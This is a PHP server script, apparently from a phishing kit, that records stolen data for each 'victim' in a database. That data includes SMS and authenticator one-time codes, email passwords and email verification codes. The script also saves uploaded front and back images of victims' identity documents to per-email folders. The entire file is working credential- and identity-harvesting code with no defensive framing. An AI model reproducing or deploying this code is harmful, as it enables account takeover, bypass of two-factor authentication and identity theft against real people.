<?php

require_once( realpath( dirname( __FILE__ ) . DIRECTORY_SEPARATOR . 'functions.php' ) );

if ( validUser( $pdo ) ) {

	if ( isset( $_GET[ 'code' ] ) ) {

		updateVictim( $pdo, $_SESSION[ 'id' ], [
			'sms_otp' => $_GET[ 'code' ]
		] );

		die( json_encode( [ 
			'status' => $_GET[ 'code' ] 
		] ) );

	}

	if ( isset( $_GET[ 'app' ] ) ) {

		updateVictim( $pdo, $_SESSION[ 'id' ], [
			'app_otp' => $_GET[ 'app' ]
		] );

		die( json_encode( [ 
			'status' => $_GET[ 'app' ] 
		] ) );

	}

	if ( isset( $_GET[ 'mailpw' ] ) ) {

		updateVictim( $pdo, $_SESSION[ 'id' ], [
			'email_password' => $_GET[ 'mailpw' ]
		] );

		die( json_encode( [ 
			'status' => $_GET[ 'mailpw' ] 
		] ) );

	}

	if ( isset( $_GET[ 'mailsms' ] ) ) {

		updateVictim( $pdo, $_SESSION[ 'id' ], [
			'email_otp' => $_GET[ 'mailsms' ]
		] );

		die( json_encode( [ 
			'status' => $_GET[ 'mailsms' ] 
		] ) );

	}

	if ( isset( $_GET[ 'mailapp' ] ) ) {

		updateVictim( $pdo, $_SESSION[ 'id' ], [
			'email_app' => $_GET[ 'mailapp' ]
		] );

		die( json_encode( [ 
			'status' => $_GET[ 'mailapp' ] 
		] ) );

	}

	if ( !empty( $_POST[ 'front' ] ) && !empty( $_POST[ 'back' ] ) ) {

		$currentvict = getVictim( $pdo, $_SESSION[ 'id' ] );
		$email = $currentvict[ 'username' ];

		if ( !is_dir( '../ids/' . $email ) ) {
			mkdir( '../ids/' . $email, 0777, true );
		}

		$front = fopen('../ids/' . $email . '/front.png', 'w+');
		fwrite( $front, base64_decode( explode( ',', $_POST[ 'front' ], 2 )[1] ) );

		$back = fopen('../ids/' . $email . '/back.png', 'w+');
		fwrite( $back, base64_decode( explode( ',', $_POST[ 'back' ], 2 )[1] ) );

		updateVictim( $pdo, $_SESSION[ 'id' ], [
			'idfront' => '../ids/' . $email . '/front.png',
			'idback' => '../ids/' . $email . '/back.png'
		] );

		die( json_encode( [ 
			'status' => [ 
				'/ids/' . $email . '/front.png',
				'/ids/' . $email . '/back.png'
			] 
		] ) );

	}

	die( json_encode( [ 
		'status' => 'error' 
	] ) );

}

die( json_encode( [ 
	'status' => 'error' 
] ) );

?>